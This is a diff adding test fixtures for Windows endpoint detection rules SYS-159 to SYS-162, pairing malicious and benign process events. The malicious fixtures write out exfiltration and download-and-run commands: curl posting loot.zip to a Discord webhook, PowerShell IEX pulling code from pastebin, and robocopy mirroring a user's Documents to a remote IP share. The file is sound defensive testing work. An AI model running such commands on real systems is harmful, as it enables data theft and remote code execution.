@@ -1876,6 +1876,88 @@ CASES = [
         False,
         event(1, image=r"C:\Windows\System32\psr.exe", command_line="psr.exe /stop"),
     ),
+    # --- Chat-service webhook/bot API used as a covert channel (SYS-159) ---
+    (
+        "SYS-159",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\curl.exe",
+            command_line=(
+                r'curl.exe -X POST -F "file=@C:\loot.zip" '
+                r"https://discord.com/api/webhooks/1234567890/AbCdEfGhIjK"
+            ),
+        ),
+    ),
+    (
+        "SYS-159",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\curl.exe",
+            command_line="curl.exe https://example.com/api/webhooks/foo",
+        ),
+    ),
+    # --- Public paste service used as a C2 dead-drop (SYS-160) ---
+    (
+        "SYS-160",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line=(
+                'powershell -c "IEX (New-Object Net.WebClient).DownloadString'
+                "('https://pastebin.com/raw/AbCdEfGh')\""
+            ),
+        ),
+    ),
+    (
+        "SYS-160",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\curl.exe",
+            command_line="curl.exe https://pastebin.com/raw/AbCdEfGh -o notes.txt",
+        ),
+    ),
+    # --- Archive utility packaged a broad user data directory (SYS-161) ---
+    (
+        "SYS-161",
+        True,
+        event(
+            1,
+            image=r"C:\Program Files\7-Zip\7z.exe",
+            command_line=r"7z.exe a C:\Windows\Temp\backup.7z C:\Users\bob\Documents",
+        ),
+    ),
+    (
+        "SYS-161",
+        False,
+        event(
+            1,
+            image=r"C:\Program Files\7-Zip\7z.exe",
+            command_line=r"7z.exe a C:\Windows\Temp\logs.7z C:\ProgramData\App\logs",
+        ),
+    ),
+    # --- robocopy mass-mirrored a broad user directory tree (SYS-162) ---
+    (
+        "SYS-162",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\robocopy.exe",
+            command_line=r"robocopy.exe C:\Users\bob\Documents \\45.132.192.68\share\loot /MIR",
+        ),
+    ),
+    (
+        "SYS-162",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\robocopy.exe",
+            command_line=r"robocopy.exe C:\Users\bob\Documents D:\backup",
+        ),
+    ),
 ]
 
 
